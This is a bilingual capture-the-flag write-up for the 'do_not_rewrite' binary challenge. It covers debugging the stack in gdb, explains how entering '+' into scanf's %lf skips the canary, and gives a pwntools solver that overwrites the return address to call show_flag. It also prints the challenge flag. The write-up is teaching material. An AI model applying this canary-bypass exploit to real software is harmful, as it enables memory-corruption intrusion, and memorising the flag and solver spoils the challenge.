---
title: do_not_rewrite
level: 2
flag: FLAG{B3_c4r3fu1_wh3n_using_th3_f0rm4t_sp3cifi3r_1f_in_sc4nf}
writer: manu1
---

# do_not_rewrite

## 問題文

canaryにはかなーり気をつけないといけません

Be careful with the canary.

`nc chal-lz56g6.wanictf.org 9004`

---

NOTE: In case the server is down, try the following backup server. 上記のサーバーが正しく動作していない場合は、次のバックアップサーバーを使用してください。

`chal-ywu5dn.wanictf.org`

---

## 解法

まずはバイナリを実行してみましょう。

First of all, let's try running the binary.

```
hint: show_flag = 0x56542d9cf25f

Enter the name of ingredient 1: 1
Enter the calories per gram for 1: 1
Enter the amount in grams for 1: 1

Enter the name of ingredient 2: 1
Enter the calories per gram for 1: 1
Enter the amount in grams for 1: 1

Enter the name of ingredient 3: 1
Enter the calories per gram for 1: 1
Enter the amount in grams for 1: 1

Enter the name of ingredient 4: 1
Enter the calories per gram for 1: 1
Enter the amount in grams for 1: 1

Total calories for the meal: 3.00 kcal
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

hintでshow_flagのアドレスをくれます。
適当に入力するとstack smash detected が表示されました。このエラーはcanaryの書き換えが起こると表示されるバグであるため、どこかでcanaryの書き換えが発生していることがわかります。

gdbで解析してみましょう。gefを使うことをおすすめします(例えばこれ: https://github.com/bata24/gef)。


The hint provides the address of show_Flag().
As we input data randomly, the message stack smash detected is displayed. This error indicates that the canary has been overwritten, which means that somewhere in the process the canary value is being altered.

Let's analyze it using gdb. I recommend using gef (for example: https://github.com/bata24/gef).

```
gdb -q chall
b *main+426
```

実行がストップしたところで`tele -l 40`とかでスタック領域を表示してみると、rbpのすぐ上に末尾が`00`になっている変数があります。これがcanaryです。

When execution stops, you can display the stack area using a command like `tele -l 40`. You'll see a variable ending in 00 just above rbp. This is the canary. 

```
0x00007fffffffde30│+0x0000: 0x0000000000000000	 ← $rsp
.
.
.
0x00007fffffffdf18│+0x00e8: 0x01be2a7b56ad5600   ← canary
0x00007fffffffdf20│+0x00f0: 0x0000000000000001	 ← $rbp
0x00007fffffffdf28│+0x00f8: 0x00007ffff7c29d90   ← return address
.
.
.
```

試しに入力するたびにteleコマンドでスタックの様子を見てみると、4回目の呼び出しでcanaryを書き換え、更にその先のreturn addressも書き換えることができるのがわかります。

つまり4回目の入力のときにcanaryを書き換えず、return addressをshow_flagに書き換えられればexploitできそうです。

canaryに当たるアドレスにはdouble型で入力が受け付けられています(%lf)。実は%lfに`+`や`-`、`.`などの文字を入力すると元のアドレスの値を書き換えずにscanfの処理が終了するという性質があります。この性質を使ってcanaryをバイパスし、return addressをヒントから得られるアドレスに書き換えてやることでフラグを取得することができます。


By observing the stack with the tele command each time you input data, you'll notice that on the fourth input, the canary gets overwritten, and you can also overwrite the return address further ahead.

In other words, it seems that if we overwrite the return address with the address of show_flag() without altering the canary during the fourth input, we might be able to exploit it.

The address corresponding to the canary accepts input as a double (%lf). In fact, when characters such as `+`, `-`, or `.` are input to %lf, the scanf processing ends without overwriting the original value at the address. By using this property to bypass the canary and overwrite the return address with the address provided in the hint, you can obtain the flag.


solverの例は以下の通りです。

The solver is as follows.
```
from pwn import *
import sys

elf = ELF("../src/chall")

io = process(elf.path)

input("let's go")

# get address of show_flag()
io.recvuntil(b"= ")
addr_show_flag = io.recvline()[:-1].decode('utf-8')
info(f"show_flag:{addr_show_flag}")

#exploit
io.recvline()
for i in range(3):
    io.sendlineafter(b": ", b"a")
    io.sendlineafter(b": ", b"1")
    io.sendlineafter(b": ", b"1")

io.sendlineafter(b": ", p64(int(addr_show_flag, 16)+8))
io.sendlineafter(b": ", b"+")
io.sendlineafter(b": ", b"+")

info(io.recvuntil(b"}"))
```